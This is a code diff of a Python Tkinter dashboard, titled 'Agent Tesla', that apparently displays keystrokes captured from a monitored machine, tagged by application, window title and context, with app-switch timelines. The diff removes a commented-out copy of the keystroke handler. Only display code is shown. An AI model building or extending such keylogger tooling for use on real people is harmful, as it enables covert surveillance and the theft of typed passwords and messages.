@@ -95,7 +95,7 @@ class Dashboard(tk.Tk):
         inner_top = tk.Frame(top, bg="#090b14")
         inner_top.pack(fill="x", padx=16, pady=10)
 
-        tk.Label(inner_top, text="◈  Agent Tesla", font=("Courier New", 16, "bold"),
+        tk.Label(inner_top, text=" Agent Tesla", font=("Courier New", 16, "bold"),
                  fg=GREEN, bg="#090b14").pack(side="left")
         tk.Label(inner_top, text="3.2.8.4 |  English (US)",
                  font=("Segoe UI", 10), fg=DIM, bg="#090b14").pack(side="left", padx=14)
@@ -419,52 +419,7 @@ class Dashboard(tk.Tk):
         self.lbl_net_dn.config(text=self._fmt(d.get("net_recv_ps", 0)) + "/s")
         self.lbl_procs.config(text=str(d.get("proc_count", "—")))
         self.lbl_platform.config(text=d.get("platform", "—"))
-    """
-    def _handle_keystroke(self, d):
-        key      = d.get("key", "")
-        key_type = d.get("key_type", "char")
-        app      = d.get("app", "Unknown")
-        title    = d.get("title", "—")
-        context  = d.get("context", "App")
-        ts       = d.get("ts", "")
 
-        # Session counter
-        self._session_keys += 1
-        self.lbl_session.config(text=f"Keystrokes this session: {self._session_keys}")
-
-        # App frequency
-        self._app_counts[app] += 1
-        self._refresh_freq_panel()
-
-        # Update active context if changed
-        if app != self._current_app or context != self._current_ctx:
-            self._current_app   = app
-            self._current_title = title
-            self._current_ctx   = context
-            col = CONTEXT_COLORS.get(context, DIM)
-
-            self.lbl_ctx_badge.config(text=context, bg=col)
-            self.lbl_ctx_app.config(text=f"App:    {app}")
-            self.lbl_ctx_title.config(text=f"Window: {title}")
-
-            self.lbl_win_ctx.config(text=context, bg=col)
-            self.lbl_win_app.config(text=app)
-            self.lbl_win_title.config(text=title[:60] + "…" if len(title) > 60 else title)
-
-            # Timeline entry for app switch
-            self._log_timeline(
-                f"[{ts}] ▶ {context}  {app}  —  {title[:50]}", "app")
-
-        # Append key to stream
-        self.key_text.config(state="normal")
-        if key_type == "special":
-            display = f"[{key}]"
-            self.key_text.insert("end", display, "special")
-        else:
-            self.key_text.insert("end", key, context)
-        self.key_text.see("end")
-        self.key_text.config(state="disabled")
-    """
     def _handle_keystroke(self, d):
         key      = d.get("key", "")
         key_type = d.get("key_type", "char")
